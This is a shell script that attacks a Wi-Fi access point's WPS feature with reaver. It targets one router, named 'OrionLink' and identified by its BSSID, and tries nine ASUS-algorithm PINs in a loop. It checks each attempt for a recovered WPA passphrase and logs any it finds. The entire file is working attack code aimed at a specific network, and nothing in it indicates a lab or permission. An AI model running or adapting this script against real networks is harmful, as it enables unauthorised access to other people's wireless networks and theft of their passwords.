#!/bin/sh
# WPS ASUS PIN Algorithm Attack - Round 2
# Target: OrionLink CC:28:AA:66:30:08 (ASUSTek Computer OUI)
# 9 ASUS-specific algorithm PINs

IFACE="wlan1mon"
BSSID="CC:28:AA:66:30:08"
CHAN="2"
LOG="/tmp/wps_asus_results.log"

echo "=== ASUS WPS PIN Attack - Round 2 ===" | tee "$LOG"
echo "Target: OrionLink ($BSSID) - ASUSTek OUI" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

test_pin() {
    PIN="$1"
    ALGO="$2"
    echo ">>> [$ALGO] Testing PIN: $PIN" | tee -a "$LOG"
    rm -f /etc/reaver/CC28AA663008.wpc 2>/dev/null

    reaver -i "$IFACE" -b "$BSSID" -c "$CHAN" -p "$PIN" -vv -N -L -d 1 -T 2 -t 8 > /tmp/wps_cur.out 2>&1 &
    RPID=$!
    WAITED=0
    while [ "$WAITED" -lt 50 ] && kill -0 "$RPID" 2>/dev/null; do
        sleep 1
        WAITED=$((WAITED + 1))
        if grep -q "WPA PSK:" /tmp/wps_cur.out 2>/dev/null; then
            break
        fi
    done
    kill "$RPID" 2>/dev/null
    wait "$RPID" 2>/dev/null
    cat /tmp/wps_cur.out | tee -a "$LOG"

    if grep -q "WPA PSK:" /tmp/wps_cur.out 2>/dev/null; then
        echo "" | tee -a "$LOG"
        echo "!!! SUCCESS !!! PIN $PIN ($ALGO) cracked the PSK!" | tee -a "$LOG"
        grep "WPA PSK:" /tmp/wps_cur.out | tee -a "$LOG"
        grep "WPS PIN:" /tmp/wps_cur.out | tee -a "$LOG"
        echo "Completed: $(date)" | tee -a "$LOG"
        exit 0
    fi
    echo "<<< $PIN ($ALGO) - failed" | tee -a "$LOG"
    echo "" | tee -a "$LOG"
    sleep 5
}

test_pin "66969693" "ASUS-NIC+1"
test_pin "66969679" "ASUS-NIC-1"
test_pin "05366781" "ASUS-Reversed"
test_pin "44691288" "ASUS-HexMix"
test_pin "09043206" "ASUS-AiMesh"
test_pin "26640921" "ASUS-XOR"
test_pin "00802475" "Broadcom-Inv"
test_pin "28081986" "ASUS-Common1"
test_pin "46891320" "ASUS-Common2"

echo "=== All ASUS PINs exhausted ===" | tee -a "$LOG"
echo "Completed: $(date)" | tee -a "$LOG"
